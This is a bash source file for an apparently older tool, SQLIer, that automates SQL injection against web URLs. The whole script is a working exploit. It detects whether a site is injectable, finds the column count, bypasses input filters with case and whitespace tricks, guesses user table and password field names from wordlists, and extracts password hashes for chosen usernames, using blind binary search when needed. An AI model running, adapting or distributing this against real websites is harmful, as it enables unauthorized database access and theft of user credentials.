#!/bin/bash

#
# SQLIer - Version 0.8.1b
#
# Author: Brad Cable
# Email: brad@bcable.net
# License: Modified BSD
# License Details:
# http://bcable.net/license.php
#

tblnms="users,user,members,phpbb_users,vb3_user,ibf_members,bbusers,bbuser,usrs,usr,accounts,account,accnts,accnt,customers,customer"
#tblnms="board_users,board_user,board_members,board_bbusers,board_bbuser,board_usrs,board_usr,board_accounts,board_account,board_accnts,board_accnt,board_customers,board_customer"
#tblnms="boardusers,boarduser,boardmembers,boardbbusers,boardbbuser,boardusrs,boardusr,boardaccounts,boardaccount,boardaccnts,boardaccnt,boardcustomers,boardcustomer"
#tblnms="forumusers,forumuser,forummembers,forumbbusers,forumbbuser,forumusrs,forumusr,forumaccounts,forumaccount,forumaccnts,forumaccnt,forumcustomers,forumcustomer"
#tblnms="forum_users,forum_user,forum_members,forum_bbusers,forum_bbuser,forum_usrs,forum_usr,forum_accounts,forum_account,forum_accnts,forum_accnt,forum_customers,forum_customer"
#tblnms="forumsusers,forumsuser,forumsmembers,forumsbbusers,forumsbbuser,forumsusrs,forumsusr,forumsaccounts,forumsaccount,forumsaccnts,forumsaccnt,forumscustomers,forumscustomer"
#tblnms="forums_users,forums_user,forums_members,forums_bbusers,forums_bbuser,forums_usrs,forums_usr,forums_accounts,forums_account,forums_accnts,forums_accnt,forums_customers,forums_customer"

unflds="username,name,user,user_name,user_username,uname,user_uname,usern,user_usern,un,user_un,usrnm,user_usrnm,usr,usernm,user_usernm,nm,user_nm"
#unflds="forum_username,forum_name,forum_user,forum_user_name,forum_user_username,forum_uname,forum_user_uname,forum_usern,forum_user_usern,forum_un,forum_user_un,forum_usrnm,forum_user_usrnm,forum_usr,forum_usernm,forum_user_usernm,forum_nm,forum_user_nm"
#unflds="forums_username,forums_name,forums_user,forums_user_name,forums_user_username,forums_uname,forums_user_uname,forums_usern,forums_user_usern,forums_un,forums_user_un,forums_usrnm,forums_user_usrnm,forums_usr,forums_usernm,forums_user_usernm,forums_nm,forums_user_nm"
#unflds="board_username,board_name,board_user,board_user_name,board_user_username,board_uname,board_user_uname,board_usern,board_user_usern,board_un,board_user_un,board_usrnm,board_user_usrnm,forum_usr,board_usernm,board_user_usernm,board_nm,board_user_nm"

pwflds="password,user_password,pass_hash,hash,pass,userpass,user_pass,pword,user_pword,passwd,user_passwd,passw,user_passw,pwrd,user_pwrd,pwd,user_pwd"
# member_,forum_,forums_
#pwflds="member_password,member_user_password,member_pass_hash,member_hash,member_pass,member_user_pass,member_pword,member_user_pword,member_passwd,member_user_passwd,member_passw,member_user_passw,member_pwrd,member_user_pwrd,member_pwd,member_user_pwd"
#pwflds="forum_password,forum_user_password,forum_pass_hash,forum_hash,forum_pass,forum_user_pass,forum_pword,forum_user_pword,forum_passwd,forum_user_passwd,forum_passw,forum_user_passw,forum_pwrd,forum_user_pwrd,forum_pwd,forum_user_pwd"
#pwflds="forums_password,forums_user_password,forums_pass_hash,forums_hash,forums_pass,forums_user_pass,forums_pword,forums_user_pword,forums_passwd,forums_user_passwd,forums_passw,forums_user_passw,forums_pwrd,forums_user_pwrd,forums_pwd,forums_user_pwd"

# Options Stuff
sleeptime=0
function strip_url(){ echo "$1" | sed -r "s/^([^\?\&\#]*).*?/\1/g"; }
while [ ! -z "$1" ]; do
	case "$1" in
		-c) shift; clearhost="$1"; url=1; break ;;
		-o) shift; outputfile="$1"; shift ;;
		-s) shift; sleeptime="$1"; shift ;;
		-u) shift; usernames="$1"; shift ;;
		-w) shift; wgetopts="$1"; shift ;;
		--help) dousage=1; break ;;
		--table-names) shift; tblnms="$1"; shift ;;
		--user-fields) shift; unflds="$1"; shift ;;
		--pass-fields) shift; pwflds="$1"; shift ;;
		-*) error="Unknown option: $1"; dousage=1; break ;;
		*)
			url="$1"
			surl="`strip_url "$url"`"
			host="`echo "$url" | sed -r "s/^.*?\:\/\///g" | sed -r "s/^([^\/]*).*$/\1/g"`"
			shift
			;;
	esac
done

if [ ! -z "$dousage" ] || [ -z "$url" ]; then
	echo
	echo "SQLIer 0.8.1b"
	echo "Author: Brad Cable <brad@bcable.net>"
	echo "License: Modified BSD (http://bcable.net/license.php)"
	echo
	echo "Usage: sqlier [OPTIONS] [url]"
	##### ################################################################################
	echo " -c [host]              Clear all exploit information stored for [host]."
	echo " -o [file]              Output cracked passwords to [file]."
	echo " -s [seconds]           Wait [seconds] between page requests."
	echo " -u [usernames]         Usernames that will be brute forced from the database,"
	echo "                        comma separated (Username1,Username2,Username3)."
	echo " -w [options]           Pass [options] to wget."
	echo
	echo "Passing Field Names:"
	echo " --table-names [table_names]   Comma separated list of table names to guess."
	echo " --user-fields [user_fields]   Comma separated list of username fields to guess."
	echo " --pass-fields [pass_fields]   Comma separated list of password fields to guess."
	echo
	[ ! -z "$error" ] && echo "$error" && echo
	exit
fi

function clear_host(){
	temp="`tempfile`"
	cat $HOME/.sqlier/exploits | grep -vE "^$1	" > $temp
	rm $HOME/.sqlier/exploits
	mv $temp $HOME/.sqlier/exploits
}

if [ ! -z "$clearhost" ]; then
	echo -n "Really clear all exploit information for '$clearhost'? "
	read -n 1 choice; echo
	[ "`echo $choice | tr Y y`" = "y" ] && clear_host $clearhost && echo "Done" || echo "Aborted"
	exit
fi

# FUNCTIONS #
function reqcnt(){
	req="`cat $reqfile`"
	let req+=1
	echo "$req" > $reqfile
}

# save to ~/.sqlier/exploits
function save(){
	[ ! -d "$HOME/.sqlier" ] && mkdir "$HOME/.sqlier"
	status_str="`get_status`"
	[ -e "$HOME/.sqlier/exploits" ] && clear_host $host
	echo "$host	$status_str" >> $HOME/.sqlier/exploits
	echo "Saved information to ~/.sqlier/exploits"
}

function quit(){
	reqs="`cat $reqfile`"
	rm $reqfile
	[ -z "$1" ] && save
	echo "Requests Sent: $reqs"
	exit
}

# one liners
function addslashes(){ echo "$1" | sed -r "s/\"/\\\\\"/g"; }
function chr(){ echo "print chr($1)" | python; }
function ord(){ echo -n $1 | od -d | sed -r "s/[ ]+/ /g" | awk "{print \$2}" | grep -v "^$"; }
function b64e(){ str="`addslashes "$1"`"; echo `echo -e "import base64\nprint base64.encodestring(\"\"\"$str\"\"\")" | python` | sed "s/ //g"; }
function b64d(){ str="`addslashes "$1"`"; echo -e "import base64\nprint base64.decodestring(\"\"\"$str\"\"\")" | python; }

function get_status(){
	urle="`b64e "$url"`"
	wgetoptse="`b64e "$wgetopts"`"
	enc="`b64e "$urle:$commstr:$fieldcnt:$tblnm:$unfld:$pwfld:$wgetoptse"`"
	echo $enc
}

function sqli(){
	[ ! -z "$sleeptime" ] && [ -z "$2" ] && sleep $sleeptime
	#echo "$url$1" 1>&2 # debug
	newurl="`echo "$url$1" | sed "s/ /%20/g"`"
	newurl="`addslashes "$newurl"`"
	#echo "$newurl" 1>&2 # debug
	wgetcmd="wget $wgetopts -q -O /dev/stdout \"$newurl\""
	#echo "$wgetcmd" 1>&2 # debug
	eval "$wgetcmd"
	reqcnt
}

function sameperc(){
	file1="`tempfile`"
	file2="`tempfile`"
	echo "$1" > $file1
	echo "$2" > $file2
	tot="`cat "$file1" "$file2" | wc -c`"
	diffmnt="`diff "$file1" "$file2" | grep "^[<>]" | sed -r "s/^..(.*)$/\1/g" | wc -c`"
	rm "$file1" "$file2"
	let "sameperc=(($tot-$diffmnt)*100)/$tot"
	echo $sameperc
}

function proximity(){
	comp1="`sameperc "$1" "$success"`"
	comp2="`sameperc "$1" "$null"`"
	comp3="`sameperc "$1" "$fail"`"
	#echo comp1 "$comp1" 1>&2 # debug
	#echo comp2 "$comp2" 1>&2 # debug
	#echo comp3 "$comp3" 1>&2 # debug
	#echo arg2 "$2" 1>&2 # debug
	#echo quer "$1" 1>&2 # debug
	#echo succ "$success" 1>&2 # debug
	#echo null "$null" 1>&2 # debug
	#echo fail "$fail" 1>&2 # debug
	if ([ "$comp1" -gt "0" ] && [ "$comp1" -gt "$comp3" ]) || ([ "$comp2" -gt "0" ] && [ "$comp2" -gt "$comp3" ]); then
		if [ -z "$2" ]; then echo 1; else [ "$comp1" -gt "$comp2" ] && echo 1; fi
	fi
}

function spaceit(){
	spaces=""
	i=0; while let i+=1 && [ "$i" -le "$1" ]; do spaces+=" "; done
}

function loop_fields(){
	loflds="$1"
	dotbl="$2"
	lofld=""
	prev=0
	i=0; while let i+=1 && [ ! -z "`echo "$loflds" | cut -d ',' -f$i`" ]; do
		lo="`echo "$loflds" | cut -d ',' -f$i`"
		#echo lo $lo 1>&2 # debug
		if [ -z "$subquery" ]; then
			[ -z "$dotbl" ] && quer="`sqli " limit 1 $unionselect $lo$fieldstrn from $tblnm limit 1$comstr"`"\
			|| quer="`sqli " limit 1 $unionselect $fieldstr from $lo limit 1$comstr"`"
		else
			[ -z "$dotbl" ] && quer="`sqli " and (select 1 from $tblnm where $lo=$lo limit 1)=(select 1)$comstr"`"\
			|| quer="`sqli " and (select 1 from $lo limit 1)=(select 1)$comstr"`"
		fi
		[ "`proximity "$quer"`" ] && lofld="$lo" && break
		let prev=${#lo}
		[ "$lo" = "$loflds" ] && break
	done
	echo "$lofld"
}

function gen_randnum(){ let "rand=$RANDOM%($2-$1+1)+$1"; echo $rand; }
function gen_randstr(){
	cnt="$1"
	newstr=""
	i=0; while let i+=1 && [ "$i" -le "$cnt" ]; do
		rand="`gen_randnum 0 61`"
		let rand+=48
		[ "$rand" -ge "58" ] && let rand+=7 && [ "$rand" -ge "91" ] && let rand+=6
		newstr="$newstr`chr $rand`"
	done
	echo $newstr
}

function charify(){
	[ -z "$2" ] && userstr="concat(" || userstr=""
	i=0; while let i+=1 && [ "$i" -le "${#1}" ]; do userstr+="char("`ord ${1:$i-1:1}`"),"; done
	userstr="${userstr:0:${#userstr}-1}"
	[ -z "$2" ] && userstr="$userstr)"
	echo "$userstr"
}
# END FUNCTIONS #

reqfile="`tempfile`"
echo 0 > $reqfile

if [ -e "$HOME/.sqlier/exploits" ]; then
	explt="`cat "$HOME/.sqlier/exploits" | grep -E -m 1 "^${host}	"`"
	if [ ! -z "$explt" ]; then
		if [ "$url" = "$surl" ]; then
			echo "Loading from stored info on '$host'..."
			status_str="`echo "$explt" | cut -f2`"
			dstr="`b64d "$status_str"`"
			url="`echo "$dstr" | cut -d ':' -f1`"
			url="`b64d "$url"`"
			surl="`strip_url "$url"`"
			commstr="`echo "$dstr" | cut -d ':' -f2`"
			fieldcnt="`echo "$dstr" | cut -d ':' -f3`"
			tblnm="`echo "$dstr" | cut -d ':' -f4`"
			unfld="`echo "$dstr" | cut -d ':' -f5`"
			pwfld="`echo "$dstr" | cut -d ':' -f6`"
			wgetoptse="`echo "$dstr" | cut -d ':' -f7`"
			wgetopts="`b64d "$wgetoptse"`"
			fromsave=1
		fi
	fi
fi

echo -n "determining if SQL Injection vulnerable..."
success="`sqli "" 1`"
fail="`sqli "'"`"
[ "$success" = "$fail" ] && fail="`sqli "\\\""`" && [ "$success" = "$fail" ] && echo " no" && quit
echo " yes"
bsucc="$success"
bfail="$fail"

echo -n "determining comments string..."
if [ ! -z "$commstr" ]; then
	comstr=" $commstr"
	null="`sqli " limit 0$comstr"`"
	echo -n " (from save)"
else
	comstr=" /*"; commstr="/*"
	null="`sqli " limit 0$comstr"`"
	[ "$null" = "$fail" ] && comstr=" --" && commstr="--" && null="`sqli " limit 0$comstr"`"\
	&& [ "$null" = "$fail" ] && comstr="" && commstr=""\
	&& null="`sqli " limit 0"`"
fi
bnull="$null"
echo " \"$commstr\""

echo -n "determining number of fields in query..."
if [ ! -z "$fieldcnt" ]; then echo -n " (from save)"
else
	success="`sqli " order by 1 limit 1$comstr"`"
	fail="`sqli " order by 9999999999999 limit 1$comstr"`"
	null=""

	max=0; min=1
	perc1="`sameperc "$bfail" "$fail"`"
	perc2="`sameperc "$bnull" "$fail"`"
	if [ "$perc1" -ge "$perc2" ]; then perc="$perc1"; comp="$fail"
	else perc="$perc2"; comp="$null"; fi
	#echo perc "$perc" 1>&2 # debug
	while [ "$max" = "0" ] || [ "$perc" -gt "`sameperc "$maxord" "$comp"`" ]; do
		let max+=10
		maxord="`sqli " order by $max limit 1$comstr"`"
		#echo max $max 1>&2 # debug
		#echo sameperc "`sameperc "$maxord" "$comp"`" 1>&2 # debug
		[ "$max" = "100" ] && break
	done

	[ "$max" = "100" ] && echo " ERROR" && quit

	while let c=$max-1 && [ "$c" != "$min" ]; do
		let check=($min+$max)/2
		chk="`sqli " order by $check limit 1$comstr"`"
		#echo $check 1>&2 # debug
		#echo sameperc "`sameperc "$chk" "$comp"`" 1>&2 # debug
		[ "$perc" -gt "`sameperc "$chk" "$comp"`" ] && min="$check" || max="$check"
		#[ "`proximity "$chk" 1`" ] && min="$check" || max="$check" # old
	done

	fieldcnt="$min"
fi
fieldstr="1"; i=2; while [ "$i" -le "$fieldcnt" ]; do fieldstr+=",$i"; let i+=1; done
fieldstrn=""; i=2; while [ "$i" -le "$fieldcnt" ]; do fieldstrn+=",$i"; let i+=1; done
echo " \"$fieldcnt\""

echo -n "determining if \"UNION SELECT\" exploit is possible on server..."
success="`sqli " limit 1 union select $fieldstr limit 1$comstr"`"
null="`sqli " limit 1 union select $fieldstr where 1=0 limit 1$comstr"`"
str="`gen_randstr 6`"
fail="`sqli " limit 1 union select $fieldstr from $str limit 1$comstr"`"
comp="`proximity "$success" 1`"

success="$bsucc"
fail="$bfail"
null="$bnull"
subquery=""
if [ "$comp" ]; then unionselect="union select" && echo " yes"
else
	spacer="`echo -e "  \t\n"`" # this tries to bypass stupid single space, spaces only, or non multiline filtering
	unionselect="uNiOn${spacer}SeLeCt" # this tries to bypass stupid case sensitive filtering
	success="`sqli " limit 1 $unionselect $fieldstr limit 1$comstr"`"
	null="`sqli " limit 1 $unionselect $fieldstr where 1=0 limit 1$comstr"`"
	fail="`sqli " limit 1 $unionselect $fieldstr,1 limit 1$comstr"`"
	if [ "`proximity "$success" 1`" ]; then echo " yes"
	else
		unionselect="uNiOn${spacer}(SeLeCt"; comstr=")$comstr" # this tries to bypass stupid spacing only filtering
		success="`sqli " limit 1 $unionselect $fieldstr limit 1$comstr"`"
		null="`sqli " limit 1 $unionselect $fieldstr where 1=0 limit 1$comstr"`"
		fail="`sqli " limit 1 $unionselect $fieldstr,1 limit 1$comstr"`"
		if [ "`proximity "$success" 1`" ]; then echo " yes"
		else
			comstr=" $commstr" # reset comstr after above attempt
			success="$bsucc"
			fail="$bfail"
			null="$bnull"
			echo " no"
			echo -n "determining if subquery exploit is possible on server..."
			subq="`sqli " and (select 1)=(select 1) /*"`"
			[ "`proximity "$subq"`" ] && echo " yes" && subquery=1
			if [ -z "$subquery" ]; then
				echo " no"
				echo "Error: Not possible to do \"UNION SELECT\" or subquery exploit.  Injection failed."
				echo
				quit
			fi
		fi
	fi
fi

echo -n "determining users table name..."
[ ! -z "$tblnm" ] && echo -n " (from save)" || tblnm="`loop_fields "$tblnms" 1`"
[ ! -z "$tblnm" ] && echo " \"$tblnm\"" || echo " couldn't guess table name"

if [ ! -z "$tblnm" ]; then

	# invision board stuff... it wasn't working so i commented it out for now
	#if [ "${tblnm:${#tblnm}-7:7}" = "members" ]; then
		#usel="`sqli " limit 1 $unionselect $fieldstr from ${tblnm}_converge limit 1$comstr"`"
		#echo -n "determining users table name..."
		#if [ "`proximity "$usel"`" ]; then
			#ibf=1
			#unfld="$tblnm.name"
			#pwfld="${tblnm}_converge.converge_pass_hash"
		#fi
	#fi

	echo -n "determining username field name..."
	[ ! -z "$unfld" ] && echo -n " (from save)" || unfld="`loop_fields "$unflds"`"
	[ ! -z "$unfld" ] && echo " \"$unfld\"" || echo " couldn't guess username field"

	echo -n "determining password field name..."
	[ ! -z "$pwfld" ] && echo -n " (from save)" || pwfld="`loop_fields "$pwflds"`"
	[ ! -z "$pwfld" ] && echo " \"$pwfld\"" || echo " couldn't guess password field"
fi

save
if [ -z "$tblnm" ] || [ -z "$unfld" ] || [ -z "$pwfld" ]; then
	echo
	echo -n "Not enough information to complete exploit... need: "
	[ -z "$tblnm" ] && need="table name, "
	[ -z "$unfld" ] && need+="username field, "
	[ -z "$pwfld" ] && need+="password field, "
	echo "${need:0:${#need}-2}"
	quit 1
fi
echo
echo "Saved exploit for host, now you can use: sqlier $host -u [USERS]"
[ -z "$usernames" ] && quit 1

nonblind=""
if [ -z "$subquery" ]; then
	randstr="`gen_randstr 32`"
	tester="`charify "$randstr"`"
	usel="`sqli " limit 0 $unionselect $tester$fieldstrn limit 1$comstr"`"
	[ "`echo "$usel" | sed "s/$randstr//g"`" != "$usel" ] && nonblind=1
fi

if [ ! -z "$nonblind" ]; then
	echo "Non blind query commencing..."
	k=0; while let k+=1 && username="`echo "$usernames" | cut -d ',' -f$k`" && [ ! -z "$username" ]; do
		echo -n "$username:"
		userstr="`charify "$username"`"
		randstr1="`gen_randstr 6`"
		randstr1c="`charify "$randstr1" 1`"
		randstr2="`gen_randstr 6`"
		randstr2c="`charify "$randstr2" 1`"
		usel="`sqli " limit 0 $unionselect concat($randstr1c,$pwfld,$randstr2c)$fieldstrn from $tblnm where $unfld=$userstr limit 1$comstr"`"

		wholepass="`echo "$usel" | sed -r "s/^.*?$randstr1(.*)$randstr2.*?$/\1/g"`"
		echo "$wholepass"

		[ ! -z "$outputfile" ] && echo "$username:$wholepass" >> $outputfile
		[ "$usernames" = "$username" ] && break
	done
else
	echo -n "Starting brute force on given username(s)..."
	[ ! -z "$outputfile" ] && echo " storing to file '$outputfile'" || echo
	echo
	echo

	k=0; while let k+=1 && username="`echo "$usernames" | cut -d ',' -f$k`" && [ ! -z "$username" ]; do
		userstr="`charify "$username"`"

		if [ "$k" = "1" ]; then
			fail="$bfail"
			if [ -z "$subquery" ]; then
				success="`sqli " limit 1 $unionselect $fieldstr from $tblnm where $unfld=$userstr limit 1$comstr"`"
				null="`sqli " limit 1 $unionselect $fieldstr from $tblnm limit 1$comstr"`"
			else
				success="`sqli " and (select 1 from $tblnm where $unfld=$userstr limit 1)=(select 1) limit 1$comstr"`"
				null="`sqli " and (select 1 from $tblnm where $unfld=$userstr limit 1)=(select 1) limit 1$comstr"`"
			fi
		fi

		function inject(){
			passstr="ord(substring($pwfld,$1,1))>$2"
			if [ -z "$subquery" ]; then
				[ -z "$ibf" ] && usel="`sqli " limit 0 $unionselect $fieldstr from $tblnm where $unfld=$userstr and $passstr limit 1$comstr"`"\
				|| usel="`sqli " limit 0 $unionselect $fieldstr from $tblnm, ${tblnm}_converge where $unfld=$userstr and id=converge_id and $passstr limit 1$comstr"`"
			else
				[ -z "$ibf" ] && usel="`sqli " and (select 1 from $tblnm where $unfld=$userstr and $passstr limit 1)=(select 1) limit 1$comstr"`"\
				|| usel="`sqli " and (select 1 from $tblnm, ${tblnm}_converge where $unfld=$userstr and id=converge_id and $passstr limit 1)=(select 1) limit 1$comstr"`"
			fi
			[ "`proximity "$usel"`" ] && echo 1
		}

		charno=1
		wholepass=""
		echo -n "$username:"
		while [ ! -z "`inject $charno 0`" ]; do
			min=0
			max=128
			while let c=$max-1 && [ "$c" != "$min" ]; do
				let check=($max+$min)/2
				[ ! -z "`inject $charno $check`" ] && min="$check" || max="$check"
			done
			chr="`chr $max`"
			echo -n $chr
			wholepass+="$chr"
			let charno+=1
		done
		let passlen=$charno-1
		echo

		[ ! -z "$outputfile" ] && echo "$username:$wholepass" >> $outputfile
		[ "$usernames" = "$username" ] && break
	done
fi

echo; quit 1 # cleanup
